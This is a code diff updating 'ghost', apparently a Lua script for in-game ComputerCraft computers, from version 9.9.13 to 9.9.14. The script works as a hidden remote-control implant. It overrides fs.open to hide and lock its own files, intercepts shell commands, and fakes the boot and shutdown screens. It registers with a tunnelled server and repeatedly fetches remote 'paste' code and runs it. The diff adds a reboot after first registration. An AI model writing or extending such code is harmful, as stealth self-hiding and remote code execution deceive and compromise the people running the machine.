@@ -1,4 +1,4 @@
--- ghost v9.9.13 (fixed paste execution via parallel.waitForAll soft-restart)
+-- ghost v9.9.14 (reboot after first registration + radar stats support)
 local URL_FILE = ".server_url"
 local CURRENT_URL = nil
 local TOKEN_FILE = ".token"
@@ -22,9 +22,8 @@ local fortress_active = false
 local MAX_STRIKES = 5
 local heartbeat_fails = 0
 
--- НОВОЕ: флаг для soft-restart parallel при изменении пастов
 _G.restart_parallel = false
-_G.current_pastes = {}  -- текущий активный список
+_G.current_pastes = {}
 
 local HIDDEN = {".token",".tk2",".mode",".server_url","sandbox","startup","ghost",".ghost_error",".ghost.log"}
 local HIDDEN_NAMES = {"startup","sandbox",".token",".tk2",".mode",".server_url","ghost","phantom",
@@ -85,9 +84,6 @@ local refresh_url
 local check_mode
 local reload_tunnel
 
--- ============================================
--- LOGGING
--- ============================================
 local function glog(msg)
     pcall(function()
         local f = orig_fs_open(LOG_FILE, "a")
@@ -106,9 +102,6 @@ local function gerr(step, err)
     if service_local then printError("[Ghost] " .. step .. ": " .. tostring(err)) end
 end
 
--- ============================================
--- SELF-UPDATE
--- ============================================
 local function do_update()
     glog("UPDATE: start")
     term.setBackgroundColor(colors.black); term.setTextColour(colors.white)
@@ -123,9 +116,6 @@ local function do_update()
     glog("UPDATE OK"); sleep(2); orig_reboot(); return true
 end
 
--- ============================================
--- STEALTH (v9.9.13: .ghost.log append разрешён + нормализация пути)
--- ============================================
 local function is_hidden_name(name)
     for _, hf in ipairs(HIDDEN) do if name == hf then return true end end
     if name:find("^%.tmp_") then return true end
@@ -143,7 +133,6 @@ local function is_hidden_path(path)
 end
 local function is_core(c) return c == ".token" or c == ".tk2" or c == "ghost" end
 
--- НОВОЕ: нормализация пути для проверок
 local function normalize_path(path)
     return tostring(path):gsub("^/",""):gsub("/$","")
 end
@@ -163,13 +152,10 @@ local function install_stealth()
         end
         fs.open = function(path, mode)
             local c = normalize_path(path)
-            
-            -- РАЗРЕШАЕМ append к .ghost.log для пастов
             if c == ".ghost.log" then
                 if mode == "a" then return orig_fs_open(path, mode) end
-                return nil  -- read/write запрещены
+                return nil
             end
-            
             if c == "startup" or is_core(c) then return nil end
             if c == ".server_url" then
                 if mode and (mode:find("w") or mode:find("a")) then return nil end
@@ -243,9 +229,6 @@ local function normal_complete(text)
     return out
 end
 
--- ============================================
--- BOOT SCREEN
--- ============================================
 local MOTD = {'Running "set" lists the current values of all settings.','Type "help" to view the help index.',
     'Use "edit" to create and modify files.','Press Ctrl+T to terminate a running program.',
     'The "alias" command can be used to create custom commands.','You can change the color of text with the "paint" program.',
@@ -272,9 +255,6 @@ local function authentic_shutdown()
     term.clear(); term.setCursorPos(1, 1); print("Goodbye"); orig_shutdown()
 end
 
--- ============================================
--- STRIKE ANALYSIS
--- ============================================
 local function find_hidden(line)
     local l = line:lower()
     for _, hn in ipairs(HIDDEN_NAMES) do if l:find(hn, 1, true) then return hn end end
@@ -299,9 +279,6 @@ end
 local function is_script_file(n) return n:find("%.lua$") or n:find("%.luau$") end
 local function is_allowed_command(c) return ALLOWED_CMDS[c:lower()] == true end
 
--- ============================================
--- URL MANAGEMENT
--- ============================================
 local function save_url(url)
     local f = orig_fs_open(URL_FILE, "w"); if f then f.write(url); f.close() end
 end
@@ -426,9 +403,6 @@ local function acquire_url()
     end
 end
 
--- ============================================
--- TOKEN
--- ============================================
 local function encrypt_token(t)
     local key = tostring(COMPUTER_ID) .. "_V6"; local r = ""
     for i = 1, #t do
@@ -473,9 +447,6 @@ load_token = function()
     return read_token_file(TOKEN_BAK)
 end
 
--- ============================================
--- MODE
--- ============================================
 local current_mode = "normal"
 local function load_mode()
     if orig_fs_exists(MODE_FILE) then
@@ -488,9 +459,6 @@ local function save_mode(m)
     local f = orig_fs_open(MODE_FILE, "w"); if f then f.write(m); f.close() end
 end
 
--- ============================================
--- HTTP
--- ============================================
 local function make_headers(token)
     local h = {}
     h["Content-Type"] = "application/json"; h["bypass-tunnel-reminder"] = "true"
@@ -555,9 +523,6 @@ trigger_fortress = function(token)
     if token then send_heartbeat(token, {}) end
 end
 
--- ============================================
--- COMMAND INTERCEPT
--- ============================================
 local function install_command_intercept()
     pcall(function()
         shell.run = function(...)
@@ -607,9 +572,6 @@ local function install_command_intercept()
 end
 local function disable_command_intercept() shell.run = orig_shell_run end
 
--- ============================================
--- REGISTRATION
--- ============================================
 local function register_sync(url, pw)
     if not url or not pw or pw == "" then return nil end
     refresh_url()
@@ -661,9 +623,6 @@ local function fetch_paste_code(name, token)
     return r.content
 end
 
--- ============================================
--- PASTE RUNNER (v9.9.13: простая функция для parallel.waitForAll)
--- ============================================
 local function paste_runner_loop(name, token)
     glog("paste_runner start: " .. name)
     while true do
@@ -671,7 +630,6 @@ local function paste_runner_loop(name, token)
             glog("paste_runner stop (restart): " .. name)
             return
         end
-        
         local ok_run, err_run = pcall(function()
             local code = fetch_paste_code(name, token)
             if not code or type(code) ~= "string" then return end
@@ -685,18 +643,13 @@ local function paste_runner_loop(name, token)
                 glog("paste " .. name .. " run ERROR: " .. tostring(re))
             end
         end)
-        
         if not ok_run then
             glog("paste " .. name .. " OUTER CRASH: " .. tostring(err_run))
         end
-        
         sleep(5)
     end
 end
 
--- ============================================
--- FORTRESS
--- ============================================
 local function fortress_console()
     draw_boot()
     while true do
@@ -707,9 +660,6 @@ local function fortress_console()
     end
 end
 
--- ============================================
--- LOOPS (v9.9.13: все проверяют _G.restart_parallel)
--- ============================================
 local function relay_watch_loop(token)
     glog("relay_watch start")
     while true do
@@ -730,7 +680,6 @@ local function relay_watch_loop(token)
     end
 end
 
--- НОВОЕ: проверяет изменения в списке пастов и триггерит restart
 local function heartbeat_loop(token)
     glog("heartbeat start")
     local fc = 0; local last_refresh = 0; local consec = 0
@@ -758,8 +707,6 @@ local function heartbeat_loop(token)
                 if consec >= 5 then reload_tunnel(); consec = 0 end
                 return
             end
-            
-            -- НОВОЕ: сравнение со списком запущенных пастов
             local changed = false
             local current = _G.current_pastes or {}
             if #(pastes or {}) ~= #current then
@@ -769,7 +716,6 @@ local function heartbeat_loop(token)
                     if current[i] ~= p then changed = true; break end
                 end
             end
-            
             if changed then
                 glog("heartbeat: pastes changed, triggering restart")
                 glog("  old: " .. table.concat(current, ", "))
@@ -778,7 +724,6 @@ local function heartbeat_loop(token)
                 _G.restart_parallel = true
                 return
             end
-            
             local sent = send_heartbeat(token, pastes)
             if sent then fc = 0; consec = 0
             else
@@ -811,9 +756,6 @@ local function mode_watcher(token)
     end
 end
 
--- ============================================
--- REPL
--- ============================================
 local function repl()
     while true do
         if fortress_active then return end
@@ -849,76 +791,66 @@ local function repl()
     end
 end
 
--- ============================================
--- BACKGROUND CONNECT (v9.9.13: soft-restart parallel при изменении пастов)
--- ============================================
+-- НОВОЕ v9.9.14: после первой регистрации делаем reboot
 local function connect_and_run(token, pending_password)
+    local is_first_registration = not token and pending_password and pending_password ~= ""
     if not token and pending_password and pending_password ~= "" then
         if acquire_url() then
             token = register_sync(CURRENT_URL, pending_password)
-            if token then save_token(token) end
+            if token then
+                save_token(token)
+                if CURRENT_URL then save_url(CURRENT_URL) end
+                if is_first_registration then
+                    glog("FIRST REGISTRATION COMPLETE - rebooting in 3s")
+                    sleep(3)
+                    orig_reboot()
+                    return  -- не идём дальше, компьютер перезагрузится
+                end
+            end
         end
     end
     if not token then
-        while true do 
+        while true do
             if _G.restart_parallel then return end
-            sleep(60) 
+            sleep(60)
         end
     end
-    
-    -- НОВОЕ: цикл с soft-restart при изменении пастов
     while true do
         _G.restart_parallel = false
-        
-        -- получаем актуальный список пастов
         local mode, pastes = check_mode(token)
         _G.current_pastes = pastes or {}
         glog("starting parallel with " .. #(pastes or {}) .. " pastes: " .. table.concat(pastes or {}, ", "))
-        
-        -- строим список задач
         local funcs = {
             function() heartbeat_loop(token) end,
             function() mode_watcher(token) end,
             function() relay_watch_loop(token) end,
             function() repl() end,
         }
-        
-        -- добавляем все пасты
         for _, pname in ipairs(pastes or {}) do
-            local name = pname  -- capture
+            local name = pname
             funcs[#funcs+1] = function() paste_runner_loop(name, token) end
         end
-        
-        -- запускаем все задачи
         local ok, err = pcall(parallel.waitForAll, table.unpack(funcs))
         if not ok then
             glog("parallel.waitForAll error: " .. tostring(err))
         end
-        
-        -- если restart не был запрошен — выходим
         if not _G.restart_parallel then
             glog("parallel ended normally, exiting")
             return
         end
-        
         glog("parallel restart requested, restarting...")
-        sleep(1)  -- небольшая пауза перед перезапуском
+        sleep(1)
     end
 end
 
--- ============================================
--- MAIN
--- ============================================
 local function run_main()
-    glog("ghost start v9.9.13")
+    glog("ghost start v9.9.14")
     install_stealth(); install_protection(); install_command_intercept(); load_mode()
     if not orig_fs_exists(SANDBOX_DIR) then pcall(fs.makeDir, SANDBOX_DIR) end
     draw_boot()
-
     local url = load_saved_url()
     if url then CURRENT_URL = url; TRUSTED_DOMAIN = extract_domain(url) end
     glog("saved URL: " .. tostring(CURRENT_URL))
-
     local token = load_token()
     local pending_password = nil
     if not token then
@@ -927,9 +859,7 @@ local function run_main()
         pending_password = read("*")
         term.setCursorBlink(false)
     end
-
     pcall(connect_and_run, token, pending_password)
-
     if fortress_active then fortress_console() end
 end
 
